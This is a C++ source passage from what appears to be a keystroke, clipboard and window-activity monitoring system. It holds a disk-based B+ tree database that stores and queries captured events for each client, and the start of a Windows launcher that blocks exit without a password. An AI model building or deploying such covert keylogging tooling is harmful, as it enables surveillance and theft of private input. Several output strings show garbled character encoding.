            record.last_seen = event.timestamp;
            saveClientRecordNoLock(record);
            {
                lock_guard<mutex> c_lock(cache_mutex_);
                client_cache_[string(record.client_id)] = record;
            }
        }

        cout << "    Keystroke inserted for client: " << record.client_id
             << " at offset: " << data_offset
             << " (total: " << record.total_keystrokes << ")" << endl;
    }

    void insertClipboard(uint32_t client_hash, const ClipboardEvent &event)
    {
        ClientRecord record;
        bool found = false;
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            for (const auto &p : client_cache_)
            {
                if (p.second.client_hash == client_hash && !p.second.isEmpty())
                {
                    record = p.second;
                    found = true;
                    break;
                }
            }
        }

        if (!found)
        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (!findClientByHashNoLock(client_hash, record))
            {
                cerr << "ERROR: Client not found for hash: " << client_hash << endl;
                return;
            }
            {
                lock_guard<mutex> c_lock(cache_mutex_);
                client_cache_[string(record.client_id)] = record;
            }
        }

        if (record.isEmpty())
        {
            cerr << "ERROR: Client with hash " << client_hash << " is marked as deleted" << endl;
            return;
        }

        uint64_t data_offset;
        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (!free_data_blocks_.empty())
            {
                data_offset = free_data_blocks_.top();
                free_data_blocks_.pop();
            }
            else
            {
                data_offset = header_.next_free_offset;
                header_.next_free_offset += sizeof(event);
            }

            if (pwrite(fd_, &event, sizeof(event), (off_t)data_offset) != (ssize_t)sizeof(event))
            {
                cerr << "ERROR: Failed to write clipboard data errno=" << errno << endl;
                return;
            }
            writeHeader();
        }

        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (record.clipboard_tree_root == 0)
            {
                record.clipboard_tree_root = allocateNodeLocked();
                initializeBPlusTreeRootLocked(record.clipboard_tree_root);
            }
            insertIntoBPlusTreeLocked(record.clipboard_tree_root, event.timestamp, data_offset);
            uint64_t new_root = getCurrentRootLocked(record.clipboard_tree_root);
            if (new_root != record.clipboard_tree_root)
                record.clipboard_tree_root = new_root;

            record.total_clipboard++;
            record.last_seen = event.timestamp;
            saveClientRecordNoLock(record);
            {
                lock_guard<mutex> c_lock(cache_mutex_);
                client_cache_[string(record.client_id)] = record;
            }
        }

        cout << "    Clipboard event inserted for client: " << record.client_id
             << " at offset: " << data_offset << endl;
    }

    void insertWindow(uint32_t client_hash, const WindowEvent &event)
    {
        ClientRecord record;
        bool found = false;
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            for (const auto &p : client_cache_)
            {
                if (p.second.client_hash == client_hash && !p.second.isEmpty())
                {
                    record = p.second;
                    found = true;
                    break;
                }
            }
        }

        if (!found)
        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (!findClientByHashNoLock(client_hash, record))
            {
                cerr << "ERROR: Client not found for hash: " << client_hash << endl;
                return;
            }
            {
                lock_guard<mutex> c_lock(cache_mutex_);
                client_cache_[string(record.client_id)] = record;
            }
        }

        if (record.isEmpty())
        {
            cerr << "ERROR: Client with hash " << client_hash << " is marked as deleted" << endl;
            return;
        }

        uint64_t data_offset;
        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (!free_data_blocks_.empty())
            {
                data_offset = free_data_blocks_.top();
                free_data_blocks_.pop();
            }
            else
            {
                data_offset = header_.next_free_offset;
                header_.next_free_offset += sizeof(event);
            }

            if (pwrite(fd_, &event, sizeof(event), (off_t)data_offset) != (ssize_t)sizeof(event))
            {
                cerr << "ERROR: Failed to write window data errno=" << errno << endl;
                return;
            }
            writeHeader();
        }

        {
            lock_guard<recursive_mutex> lock(db_mutex_);
            if (record.window_tree_root == 0)
            {
                record.window_tree_root = allocateNodeLocked();
                initializeBPlusTreeRootLocked(record.window_tree_root);
            }
            insertIntoBPlusTreeLocked(record.window_tree_root, event.timestamp, data_offset);
            uint64_t new_root = getCurrentRootLocked(record.window_tree_root);
            if (new_root != record.window_tree_root)
                record.window_tree_root = new_root;

            record.total_windows++;
            record.last_seen = event.timestamp;
            saveClientRecordNoLock(record);
            {
                lock_guard<mutex> c_lock(cache_mutex_);
                client_cache_[string(record.client_id)] = record;
            }
        }

        cout << "    Window event inserted for client: " << record.client_id
             << " at offset: " << data_offset << endl;
    }

    bool queryClientEventsByTimeRange(const string &client_id,
                                      uint64_t start_timestamp,
                                      uint64_t end_timestamp,
                                      QueryResult &result)
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        ClientRecord record;
        if (!loadClientRecordNoLock(client_id, record))
        {
            cerr << "Client not found: " << client_id << endl;
            return false;
        }

        if (record.isEmpty())
        {
            cerr << "Client is marked as deleted: " << client_id << endl;
            return false;
        }

        queryBPlusTreeRangeLocked(record.keystroke_tree_root,
                                  start_timestamp, end_timestamp,
                                  result.keystrokes);

        queryBPlusTreeRangeLocked(record.clipboard_tree_root,
                                  start_timestamp, end_timestamp,
                                  result.clipboard_events);

        queryBPlusTreeRangeLocked(record.window_tree_root,
                                  start_timestamp, end_timestamp,
                                  result.window_events);

        cout << "âœ“ Retrieved " << result.totalEvents() << " events for client: " << client_id << endl;
        cout << "  - Keystrokes: " << result.keystrokes.size() << endl;
        cout << "  - Clipboard: " << result.clipboard_events.size() << endl;
        cout << "  - Windows: " << result.window_events.size() << endl;
        return true;
    }

    bool queryClientAllEvents(const string &client_id, QueryResult &result)
    {
        return queryClientEventsByTimeRange(client_id, 0, UINT64_MAX, result);
    }

    bool clientExists(const string &client_id)
    {
        // Check cache FIRST
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            auto it = client_cache_.find(client_id);
            if (it != client_cache_.end())
            {
                return !it->second.isEmpty();
            }
        }

        // If not in cache, check disk
        lock_guard<recursive_mutex> lock(db_mutex_);
        ClientRecord record;
        if (!loadClientRecordNoLock(client_id, record))
            return false;

        return !record.isEmpty();
    }

    // bool clientExists(const string &client_id)
    // {
    //     {
    //         lock_guard<mutex> c_lock(cache_mutex_);
    //         auto it = client_cache_.find(client_id);
    //         if (it != client_cache_.end())
    //         {
    //             return !it->second.isEmpty();
    //         }
    //     }

    //     lock_guard<recursive_mutex> lock(db_mutex_);
    //     ClientRecord record;
    //     if (!loadClientRecordNoLock(client_id, record))
    //         return false;

    //     return !record.isEmpty();
    // }

    vector<string> getAllClients()
    {
        vector<string> clients;

        // Get from cache first
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            for (const auto &p : client_cache_)
            {
                if (!p.second.isEmpty())
                    clients.push_back(p.first);
            }
        }

        // Also scan hash table on disk for any clients not in cache
        lock_guard<recursive_mutex> lock(db_mutex_);
        for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
        {
            uint64_t offset = hash_table_offset_ + (i * sizeof(HashTableSlot));
            HashTableSlot hs;
            if (pread(fd_, &hs, sizeof(hs), (off_t)offset) != (ssize_t)sizeof(hs))
                continue;

            if (!hs.client.isEmpty())
            {
                string client_id(hs.client.client_id);
                // Check if already in our list
                if (find(clients.begin(), clients.end(), client_id) == clients.end())
                {
                    clients.push_back(client_id);
                    // Also add to cache
                    {
                        lock_guard<mutex> c_lock(cache_mutex_);
                        client_cache_[client_id] = hs.client;
                    }
                }
            }
        }

        return clients;
    }
    // vector<string> getAllClients()
    // {
    //     lock_guard<mutex> c_lock(cache_mutex_);
    //     vector<string> clients;
    //     for (const auto &p : client_cache_)
    //         if (!p.second.isEmpty())
    //             clients.push_back(p.first);
    //     return clients;
    // }

    bool getClientStats(const string &client_id, ClientRecord &record)
    {
        // Check cache first
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            auto it = client_cache_.find(client_id);
            if (it != client_cache_.end() && !it->second.isEmpty())
            {
                record = it->second;
                return true;
            }
        }

        // Then check disk
        lock_guard<recursive_mutex> lock(db_mutex_);
        if (!loadClientRecordNoLock(client_id, record))
            return false;

        return !record.isEmpty();
    }

    // bool getClientStats(const string &client_id, ClientRecord &record)
    // {
    //     lock_guard<recursive_mutex> lock(db_mutex_);
    //     if (!loadClientRecordNoLock(client_id, record))
    //         return false;
    //     return !record.isEmpty();
    // }

    void printStats()
    {
        lock_guard<recursive_mutex> lock(db_mutex_);
        cout << "\n=== DATABASE STATS ===" << endl;
        cout << "File size: " << (header_.file_size / 1024.0 / 1024.0) << " MB" << endl;
        cout << "Used space: " << (header_.next_free_offset / 1024.0 / 1024.0) << " MB" << endl;
        cout << "Usage: " << (header_.next_free_offset * 100.0 / header_.file_size) << "%" << endl;
        cout << "Total clients: " << header_.num_clients << endl;
        {
            lock_guard<mutex> c_lock(cache_mutex_);
            cout << "Cached clients: " << client_cache_.size() << endl;
        }
        cout << "Free B+ tree nodes: " << free_bplus_nodes_.size() << endl;
        cout << "Free data blocks: " << free_data_blocks_.size() << endl;
    }

private:
    bool initializeDatabase()
    {
        header_ = DatabaseHeader();

        // FIX: Set correct offsets
        header_.client_table_offset = sizeof(DatabaseHeader); // 256 bytes
        header_.keystroke_tree_offset = header_.client_table_offset +
                                        (HASH_TABLE_SIZE * sizeof(HashTableSlot)); // 256 + 1024*256 = 262,400
        header_.clipboard_tree_offset = header_.keystroke_tree_offset + sizeof(BPlusTreeNode);
        header_.window_tree_offset = header_.clipboard_tree_offset + sizeof(BPlusTreeNode);
        header_.next_free_offset = header_.window_tree_offset + sizeof(BPlusTreeNode);

        cout << "ðŸ’¾ Initializing database with 100MB file" << endl;
        cout << "  Hash table: " << header_.client_table_offset << endl;
        cout << "  Keystroke tree: " << header_.keystroke_tree_offset << endl;
        cout << "  Next free: " << header_.next_free_offset << endl;

        // FIX: Use proper file size
        if (ftruncate(fd_, header_.file_size) < 0)
        {
            cerr << "Failed to allocate 100MB file errno=" << errno << endl;
            return false;
        }

        if (!writeHeader())
            return false;

        // Initialize hash table with empty slots
        HashTableSlot empty_slot;
        for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
        {
            uint64_t offset = header_.client_table_offset + (i * sizeof(HashTableSlot));
            if (pwrite(fd_, &empty_slot, sizeof(empty_slot), (off_t)offset) != (ssize_t)sizeof(empty_slot))
            {
                cerr << "Failed to init hash slot " << i << endl;
                return false;
            }
        }

        fsync(fd_);
        cout << "âœ… Database initialized: 100MB file created" << endl;
        return true;
    }

    bool readHeader()
    {
        if (pread(fd_, &header_, sizeof(header_), 0) != (ssize_t)sizeof(header_))
            return false;
        return true;
    }

    // bool writeHeader()
    // {
    //     if (pwrite(fd_, &header_, sizeof(header_), 0) != (ssize_t)sizeof(header_))
    //         return false;
    //     fsync(fd_);
    //     return true;
    // }

    bool writeHeader()
    {
        lock_guard<recursive_mutex> lock(db_mutex_);

        cout << "ðŸ’¾ [WRITE HEADER] Writing header at offset 0\n";
        cout << "  Magic: 0x" << hex << header_.magic << dec << "\n";
        cout << "  File size: " << header_.file_size << " bytes\n";
        cout << "  Next free: " << header_.next_free_offset << "\n";
        cout << "  Num clients: " << header_.num_clients << "\n";

        // DEBUG: Print raw bytes
        cout << "  Raw header (first 64 bytes): ";
        char *raw = (char *)&header_;
        for (int i = 0; i < 64; i++)
        {
            printf("%02x ", (unsigned char)raw[i]);
        }
        cout << "\n";

        ssize_t result = pwrite(fd_, &header_, sizeof(header_), 0);

        if (result != (ssize_t)sizeof(header_))
        {
            cerr << "âŒ HEADER WRITE FAILED! Expected: " << sizeof(header_)
                 << ", Got: " << result << ", errno=" << errno << endl;
            return false;
        }

        // Force sync
        fsync(fd_);
        return true;
    }

    uint64_t allocateNodeLocked()
    {
        uint64_t offset = header_.next_free_offset;
        header_.next_free_offset += sizeof(BPlusTreeNode);
        writeHeader();
        return offset;
    }

    bool readNodeLocked(uint64_t offset, BPlusTreeNode &node)
    {
        if (offset == 0)
            return false;
        if (offset + sizeof(BPlusTreeNode) > header_.file_size)
            return false;
        if (pread(fd_, &node, sizeof(node), (off_t)offset) != (ssize_t)sizeof(node))
            return false;
        return true;
    }

    bool writeNodeLocked(uint64_t offset, const BPlusTreeNode &node)
    {
        if (offset == 0)
            return false;
        if (pwrite(fd_, &node, sizeof(node), (off_t)offset) != (ssize_t)sizeof(node))
            return false;
        fsync(fd_);
        return true;
    }

    void initializeBPlusTreeRootLocked(uint64_t offset)
    {
        if (offset == 0)
            return;
        BPlusTreeNode root;
        memset(&root, 0, sizeof(root));
        root.is_leaf = true;
        root.num_keys = 0;
        writeNodeLocked(offset, root);
    }

    bool loadClientRecordNoLock(const string &client_id, ClientRecord &record)
    {
        uint32_t hash = ClientRecord::hashString(client_id);
        size_t slot = hash % HASH_TABLE_SIZE;

        for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
        {
            size_t idx = (slot + i) % HASH_TABLE_SIZE;
            uint64_t offset = hash_table_offset_ + (idx * sizeof(HashTableSlot));
            HashTableSlot hs;
            if (pread(fd_, &hs, sizeof(hs), (off_t)offset) != (ssize_t)sizeof(hs))
                continue;

            if (hs.client.isEmpty())
                return false;

            if (string(hs.client.client_id) == client_id && !hs.client.isEmpty())
            {
                record = hs.client;
                return true;
            }
        }
        return false;
    }

    void saveClientRecordNoLock(const ClientRecord &record)
    {
        uint32_t hash = record.client_hash;
        size_t slot = hash % HASH_TABLE_SIZE;

        for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
        {
            size_t idx = (slot + i) % HASH_TABLE_SIZE;
            uint64_t offset = hash_table_offset_ + (idx * sizeof(HashTableSlot));
            HashTableSlot hs;
            pread(fd_, &hs, sizeof(hs), (off_t)offset);

            if (hs.client.isEmpty() || string(hs.client.client_id) == record.client_id)
            {
                HashTableSlot newhs = hs;
                newhs.client = record;
                if (pwrite(fd_, &newhs, sizeof(newhs), (off_t)offset) != (ssize_t)sizeof(newhs))
                {
                    cerr << "Failed to save client record errno=" << errno << endl;
                }
                fsync(fd_);
                return;
            }
        }
    }

    void removeClientFromHashTableLocked(const string &client_id)
    {
        uint32_t hash = ClientRecord::hashString(client_id);
        size_t slot = hash % HASH_TABLE_SIZE;

        for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
        {
            size_t idx = (slot + i) % HASH_TABLE_SIZE;
            uint64_t offset = hash_table_offset_ + (idx * sizeof(HashTableSlot));
            HashTableSlot hs;
            if (pread(fd_, &hs, sizeof(hs), (off_t)offset) != (ssize_t)sizeof(hs))
                continue;

            if (string(hs.client.client_id) == client_id && !hs.client.isEmpty())
            {
                // Clear this slot completely
                HashTableSlot empty;
                memset(&empty, 0, sizeof(empty));
                if (pwrite(fd_, &empty, sizeof(empty), (off_t)offset) != (ssize_t)sizeof(empty))
                {
                    cerr << "Failed to clear hash table slot errno=" << errno << endl;
                }
                fsync(fd_);
                cout << "âœ“ Client removed from hash table: " << client_id << endl;
                return;
            }
        }
    }

    // // FIXED: New function to properly remove client from hash table
    // void removeClientFromHashTableLocked(const string &client_id)
    // {
    //     uint32_t hash = ClientRecord::hashString(client_id);
    //     size_t slot = hash % HASH_TABLE_SIZE;

    //     for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
    //     {
    //         size_t idx = (slot + i) % HASH_TABLE_SIZE;
    //         uint64_t offset = hash_table_offset_ + (idx * sizeof(HashTableSlot));
    //         HashTableSlot hs;
    //         if (pread(fd_, &hs, sizeof(hs), (off_t)offset) != (ssize_t)sizeof(hs))
    //             continue;

    //         if (string(hs.client.client_id) == client_id)
    //         {
    //             // Clear this slot completely
    //             HashTableSlot empty;
    //             memset(&empty, 0, sizeof(empty));
    //             if (pwrite(fd_, &empty, sizeof(empty), (off_t)offset) != (ssize_t)sizeof(empty))
    //             {
    //                 cerr << "Failed to clear hash table slot errno=" << errno << endl;
    //             }
    //             fsync(fd_);
    //             return;
    //         }
    //     }
    // }

    bool findClientByHashNoLock(uint32_t hash, ClientRecord &out)
    {
        for (size_t i = 0; i < HASH_TABLE_SIZE; ++i)
        {
            uint64_t offset = hash_table_offset_ + (i * sizeof(HashTableSlot));
            HashTableSlot hs;
            if (pread(fd_, &hs, sizeof(hs), (off_t)offset) != (ssize_t)sizeof(hs))
                continue;

            if (!hs.client.isEmpty() && hs.client.client_hash == hash && !hs.client.isEmpty())
            {
                out = hs.client;
                return true;
            }
        }
        return false;
    }

    void insertIntoBPlusTreeLocked(uint64_t node_offset, uint64_t key, uint64_t data_offset)
    {
        if (node_offset == 0)
        {
            cerr << "ERROR: Attempting to insert into null node" << endl;
            return;
        }

        BPlusTreeNode node;
        if (!readNodeLocked(node_offset, node))
        {
            cerr << "ERROR: Failed to read B+ tree node at offset " << node_offset << endl;
            return;
        }

        if (node.num_keys > BPLUS_ORDER)
        {
            cerr << "ERROR: Corrupted node! num_keys=" << node.num_keys << " exceeds BPLUS_ORDER=" << BPLUS_ORDER << endl;
            node.num_keys = 0;
            node.is_leaf = true;
            writeNodeLocked(node_offset, node);
            return;
        }

        if (node.is_leaf)
        {
            if (node.num_keys < BPLUS_ORDER)
            {
                insertIntoLeafLocked(node, key, data_offset);
                writeNodeLocked(node_offset, node);
            }
            else
            {
                splitLeafNodeLocked(node_offset, node, key, data_offset);
            }
        }
        else
        {
            uint32_t child_idx = 0;
            while (child_idx < node.num_keys && key >= node.keys[child_idx])
                child_idx++;
            uint64_t child_off = node.children[child_idx];
            if (child_off == 0)
            {
                cerr << "ERROR: Invalid child offset during internal insert" << endl;
                return;
            }
            insertIntoBPlusTreeLocked(child_off, key, data_offset);
        }
    }

    void insertIntoLeafLocked(BPlusTreeNode &node, uint64_t key, uint64_t data_offset)
    {
        int insert_pos = (int)node.num_keys;
        while (insert_pos > 0 && node.keys[insert_pos - 1] > key)
        {
            node.keys[insert_pos] = node.keys[insert_pos - 1];
            node.children[insert_pos] = node.children[insert_pos - 1];
            insert_pos--;
        }
        node.keys[insert_pos] = key;
        node.children[insert_pos] = data_offset;
        node.num_keys++;
    }

    void splitLeafNodeLocked(uint64_t node_offset, BPlusTreeNode &node, uint64_t key, uint64_t data_offset)
    {
        vector<uint64_t> temp_keys;
        vector<uint64_t> temp_children;
        temp_keys.reserve(BPLUS_ORDER + 1);
        temp_children.reserve(BPLUS_ORDER + 1);

        bool inserted = false;
        for (uint32_t i = 0; i < node.num_keys; ++i)
        {
            if (!inserted && key < node.keys[i])
            {
                temp_keys.push_back(key);
                temp_children.push_back(data_offset);
                inserted = true;
            }
            temp_keys.push_back(node.keys[i]);
            temp_children.push_back(node.children[i]);
        }
        if (!inserted)
        {
            temp_keys.push_back(key);
            temp_children.push_back(data_offset);
        }

        uint32_t total_keys = (uint32_t)temp_keys.size();
        uint32_t split_point = (total_keys + 1) / 2;

        uint64_t new_node_offset = allocateNodeLocked();

        BPlusTreeNode new_node;
        memset(&new_node, 0, sizeof(new_node));
        new_node.is_leaf = true;
        new_node.parent_offset = node.parent_offset;
        new_node.next_leaf = node.next_leaf;

        node.num_keys = split_point;
        for (uint32_t k = 0; k < split_point; ++k)
        {
            node.keys[k] = temp_keys[k];
            node.children[k] = temp_children[k];
        }
        for (uint32_t k = split_point; k < BPLUS_ORDER; ++k)
        {
            node.keys[k] = 0;
            node.children[k] = 0;
        }

        new_node.num_keys = total_keys - split_point;
        for (uint32_t k = 0; k < new_node.num_keys; ++k)
        {
            new_node.keys[k] = temp_keys[split_point + k];
            new_node.children[k] = temp_children[split_point + k];
        }
        for (uint32_t k = new_node.num_keys; k < BPLUS_ORDER; ++k)
        {
            new_node.keys[k] = 0;
            new_node.children[k] = 0;
        }

        node.next_leaf = new_node_offset;

        writeNodeLocked(node_offset, node);
        writeNodeLocked(new_node_offset, new_node);

        uint64_t promoted_key = temp_keys[split_point];
        if (node.parent_offset == 0)
            createNewRootLocked(node_offset, new_node_offset, promoted_key);
        else
            insertKeyIntoParentLocked(node.parent_offset, promoted_key, new_node_offset);
    }

    void insertKeyIntoParentLocked(uint64_t parent_offset, uint64_t key, uint64_t child_offset)
    {
        if (parent_offset == 0)
            return;

        BPlusTreeNode parent;
        if (!readNodeLocked(parent_offset, parent))
        {
            cerr << "ERROR: Failed to read parent node at " << parent_offset << endl;
            return;
        }

        if (parent.num_keys > BPLUS_ORDER)
        {
            cerr << "ERROR: Corrupted parent node at " << parent_offset << endl;
            return;
        }

        if (parent.num_keys < BPLUS_ORDER)
        {
            insertIntoInternalNodeLocked(parent, key, child_offset);
            writeNodeLocked(parent_offset, parent);
            updateChildParentLocked(child_offset, parent_offset);
        }
        else
        {
            splitInternalNodeLocked(parent_offset, parent, key, child_offset);
        }
    }

    void insertIntoInternalNodeLocked(BPlusTreeNode &node, uint64_t key, uint64_t child_offset)
    {
        int insert_pos = (int)node.num_keys;
        while (insert_pos > 0 && node.keys[insert_pos - 1] > key)
        {
            node.keys[insert_pos] = node.keys[insert_pos - 1];
            node.children[insert_pos + 1] = node.children[insert_pos];
            insert_pos--;
        }
        node.keys[insert_pos] = key;
        node.children[insert_pos + 1] = child_offset;
        node.num_keys++;
    }

    void splitInternalNodeLocked(uint64_t node_offset, BPlusTreeNode &node, uint64_t key, uint64_t child_offset)
    {
        vector<uint64_t> temp_keys;
        vector<uint64_t> temp_children;
        temp_keys.reserve(BPLUS_ORDER + 1);
        temp_children.reserve(BPLUS_ORDER + 2);

        for (uint32_t i = 0; i <= node.num_keys; ++i)
            temp_children.push_back(node.children[i]);

        bool inserted = false;
        uint32_t i = 0;
        for (; i < node.num_keys; ++i)
        {
            if (!inserted && key < node.keys[i])
            {
                temp_keys.push_back(key);
                temp_children.insert(temp_children.begin() + i + 1, child_offset);
                inserted = true;
                break;
            }
        }
        if (!inserted)
        {
            temp_keys = vector<uint64_t>(node.keys, node.keys + node.num_keys);
            temp_keys.push_back(key);
            temp_children.push_back(child_offset);
        }
        else
        {
            for (; i < node.num_keys; ++i)
                temp_keys.push_back(node.keys[i]);
        }

        uint32_t total_keys = (uint32_t)temp_keys.size();
        uint32_t split_point = total_keys / 2;

        uint64_t new_node_offset = allocateNodeLocked();

        BPlusTreeNode new_node;
        memset(&new_node, 0, sizeof(new_node));
        new_node.is_leaf = false;
        new_node.parent_offset = node.parent_offset;

        node.num_keys = split_point;
        for (uint32_t k = 0; k < split_point; ++k)
        {
            node.keys[k] = temp_keys[k];
            node.children[k] = temp_children[k];
        }
        node.children[split_point] = temp_children[split_point];

        uint64_t promoted_key = temp_keys[split_point];

        new_node.num_keys = total_keys - split_point - 1;
        for (uint32_t k = 0; k < new_node.num_keys; ++k)
        {
            new_node.keys[k] = temp_keys[split_point + 1 + k];
            new_node.children[k] = temp_children[split_point + 1 + k];
        }
        new_node.children[new_node.num_keys] = temp_children[total_keys];

        writeNodeLocked(node_offset, node);
        writeNodeLocked(new_node_offset, new_node);

        for (uint32_t k = 0; k <= new_node.num_keys; ++k)
            updateChildParentLocked(new_node.children[k], new_node_offset);

        if (node.parent_offset == 0)
            createNewRootLocked(node_offset, new_node_offset, promoted_key);
        else
            insertKeyIntoParentLocked(node.parent_offset, promoted_key, new_node_offset);
    }

    void createNewRootLocked(uint64_t left_child, uint64_t right_child, uint64_t key)
    {
        uint64_t new_root_offset = allocateNodeLocked();

        BPlusTreeNode root;
        memset(&root, 0, sizeof(root));
        root.is_leaf = false;
        root.num_keys = 1;
        root.keys[0] = key;
        root.children[0] = left_child;
        root.children[1] = right_child;
        root.parent_offset = 0;

        writeNodeLocked(new_root_offset, root);
        updateChildParentLocked(left_child, new_root_offset);
        updateChildParentLocked(right_child, new_root_offset);
    }

    void updateChildParentLocked(uint64_t child_offset, uint64_t parent_offset)
    {
        if (child_offset == 0)
            return;
        BPlusTreeNode child;
        if (!readNodeLocked(child_offset, child))
            return;
        child.parent_offset = parent_offset;
        writeNodeLocked(child_offset, child);
    }

    uint64_t getCurrentRootLocked(uint64_t start_offset)
    {
        if (start_offset == 0)
            return 0;
        uint64_t current = start_offset;
        BPlusTreeNode node;
        if (!readNodeLocked(current, node))
            return start_offset;
        while (node.parent_offset != 0)
        {
            current = node.parent_offset;
            if (!readNodeLocked(current, node))
                break;
        }
        return current;
    }

    void queryBPlusTreeRangeLocked(uint64_t node_offset,
                                   uint64_t start_timestamp,
                                   uint64_t end_timestamp,
                                   vector<KeystrokeEvent> &results)
    {
        if (node_offset == 0)
            return;

        BPlusTreeNode node;
        if (!readNodeLocked(node_offset, node))
            return;

        if (node.is_leaf)
        {
            for (uint32_t i = 0; i < node.num_keys; ++i)
            {
                uint64_t timestamp = node.keys[i];
                uint64_t data_offset = node.children[i];

                if (timestamp >= start_timestamp && timestamp <= end_timestamp)
                {
                    KeystrokeEvent event;
                    if (pread(fd_, &event, sizeof(event), (off_t)data_offset) == (ssize_t)sizeof(event))
                    {
                        results.push_back(event);
                    }
                }
            }
        }
        else
        {
            for (uint32_t i = 0; i <= node.num_keys; ++i)
            {
                if (i < node.num_keys && start_timestamp > node.keys[i])
                    continue;
                if (i > 0 && end_timestamp < node.keys[i - 1])
                    break;

                queryBPlusTreeRangeLocked(node.children[i], start_timestamp, end_timestamp, results);
            }
        }
    }

    void queryBPlusTreeRangeLocked(uint64_t node_offset,
                                   uint64_t start_timestamp,
                                   uint64_t end_timestamp,
                                   vector<ClipboardEvent> &results)
    {
        if (node_offset == 0)
            return;

        BPlusTreeNode node;
        if (!readNodeLocked(node_offset, node))
            return;

        if (node.is_leaf)
        {
            for (uint32_t i = 0; i < node.num_keys; ++i)
            {
                uint64_t timestamp = node.keys[i];
                uint64_t data_offset = node.children[i];

                if (timestamp >= start_timestamp && timestamp <= end_timestamp)
                {
                    ClipboardEvent event;
                    if (pread(fd_, &event, sizeof(event), (off_t)data_offset) == (ssize_t)sizeof(event))
                    {
                        results.push_back(event);
                    }
                }
            }
        }
        else
        {
            for (uint32_t i = 0; i <= node.num_keys; ++i)
            {
                if (i < node.num_keys && start_timestamp > node.keys[i])
                    continue;
                if (i > 0 && end_timestamp < node.keys[i - 1])
                    break;

                queryBPlusTreeRangeLocked(node.children[i], start_timestamp, end_timestamp, results);
            }
        }
    }

    void queryBPlusTreeRangeLocked(uint64_t node_offset,
                                   uint64_t start_timestamp,
                                   uint64_t end_timestamp,
                                   vector<WindowEvent> &results)
    {
        if (node_offset == 0)
            return;

        BPlusTreeNode node;
        if (!readNodeLocked(node_offset, node))
            return;

        if (node.is_leaf)
        {
            for (uint32_t i = 0; i < node.num_keys; ++i)
            {
                uint64_t timestamp = node.keys[i];
                uint64_t data_offset = node.children[i];

                if (timestamp >= start_timestamp && timestamp <= end_timestamp)
                {
                    WindowEvent event;
                    if (pread(fd_, &event, sizeof(event), (off_t)data_offset) == (ssize_t)sizeof(event))
                    {
                        results.push_back(event);
                    }
                }
            }
        }
        else
        {
            for (uint32_t i = 0; i <= node.num_keys; ++i)
            {
                if (i < node.num_keys && start_timestamp > node.keys[i])
                    continue;
                if (i > 0 && end_timestamp < node.keys[i - 1])
                    break;

                queryBPlusTreeRangeLocked(node.children[i], start_timestamp, end_timestamp, results);
            }
        }
    }

    void reclaimBPlusTreeSpaceLocked(uint64_t node_offset)
    {
        if (node_offset == 0)
            return;
        BPlusTreeNode node;
        if (!readNodeLocked(node_offset, node))
            return;

        if (node.is_leaf)
        {
            for (uint32_t i = 0; i < node.num_keys; ++i)
                free_data_blocks_.push(node.children[i]);

            if (node.next_leaf != 0)
                reclaimBPlusTreeSpaceLocked(node.next_leaf);
        }
        else
        {
            for (uint32_t i = 0; i <= node.num_keys; ++i)
                reclaimBPlusTreeSpaceLocked(node.children[i]);
        }

        free_bplus_nodes_.push(node_offset);
    }
};

#endif


===== FILE: ./process_guard_windows.hpp =====

#ifndef PROCESS_GUARD_WINDOWS_HPP
#define PROCESS_GUARD_WINDOWS_HPP

#ifdef PLATFORM_WINDOWS

#include <windows.h>
#include <string>
#include <iostream>
#include <atomic>
#include "launcher_common.hpp"
#include "password_dialog_windows.hpp"
using namespace std; 

class ProcessGuardWindows {
private:
    PROCESS_INFORMATION processInfo;
    HANDLE jobObject;
      atomic<bool>& exit_authorized;
    static ProcessGuardWindows* instance_;
    
public:
    ProcessGuardWindows(  atomic<bool>& auth) 
        : processInfo{0}, jobObject(NULL), exit_authorized(auth) {
        instance_ = this;
        ZeroMemory(&processInfo, sizeof(processInfo));
    }
    
    ~ProcessGuardWindows() {
        cleanup();
        instance_ = nullptr;
    }
    
    bool launchClient(const   string& executable, const   string& args) {
          cout << "ðŸ›¡ï¸  Guardian: Launching protected client..." <<   endl;
        
        // Install console control handler for Ctrl+C, Ctrl+Break, Close
        if (!SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE)) {
              cerr << "âš ï¸  Warning: Failed to install console handler" <<   endl;
        }
        
        // Create job object to tie child process lifecycle to parent
        jobObject = CreateJobObjectA(NULL, NULL);
        if (jobObject) {
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {0};
            jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            
            SetInformationJobObject(jobObject, JobObjectExtendedLimitInformation,
                                   &jeli, sizeof(jeli));
        }
        
        // Build command line
          string cmdLine = executable + " " + args;
        char* cmdLineBuffer = new char[cmdLine.length() + 1];
        strcpy_s(cmdLineBuffer, cmdLine.length() + 1, cmdLine.c_str());
        
        // Create process WITHOUT new console - inherit parent's console
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        
        BOOL success = CreateProcessA(
            NULL,
            cmdLineBuffer,
            NULL, NULL, 
            TRUE,  // Inherit handles
            0,     // No special flags - use parent's console
            NULL, NULL,
            &si, &processInfo
        );
        
        delete[] cmdLineBuffer;
        
        if (!success) {
            DWORD error = GetLastError();
              cerr << "âŒ Failed to launch client. Error code: " << error <<   endl;
            return false;
        }
        
        // Assign to job object
        if (jobObject) {
            if (!AssignProcessToJobObject(jobObject, processInfo.hProcess)) {
                  cerr << "âš ï¸  Warning: Failed to assign process to job object" <<   endl;
            }
        }
        
          cout << "âœ… Client launched successfully under protection (PID: " 
                  << processInfo.dwProcessId << ")" <<   endl;
          cout << "ðŸ”’ Exit protection active - password required to exit" <<   endl;
